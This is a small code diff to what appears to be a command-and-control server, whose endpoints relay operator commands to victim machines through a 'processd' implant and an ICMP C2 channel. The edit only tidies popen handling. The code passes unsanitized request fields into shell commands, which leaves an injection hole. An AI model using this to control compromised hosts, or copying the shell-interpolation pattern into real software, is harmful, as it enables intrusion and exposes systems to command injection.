@@ -15,7 +15,8 @@ def processd():
     # Does nothing with return port
     vic_ip = request.json['vic_ip']
     command = request.json['command']
-    raw = popen(f"echo \"{vic_ip}\n{command}\n\" | python3 {dirname}/../processd/send_command.py").read()
+    with popen(f"echo \"{vic_ip}\n{command}\n\" | python3 {dirname}/../processd/send_command.py") as f:
+        raw = f.read()
     print(f"Processd raw: {raw}")
     output = raw.split("\n", 1)[1]
     return output
@@ -25,7 +26,8 @@ def icmp():
     # Does nothing with return port
     vic_ip = request.json['vic_ip']
     command = request.json['command']
-    raw = popen(f"echo \"{command}\n\" | python3 {dirname}/../icmp-c2/send_command.py {vic_ip}").read()
+    with popen(f"echo \"{command}\n\" | python3 {dirname}/../icmp-c2/send_command.py {vic_ip}") as f:
+        raw = f.read()
     print(f"ICMP: {raw}")
     output = raw.split("\n", 1)[1]
     return output
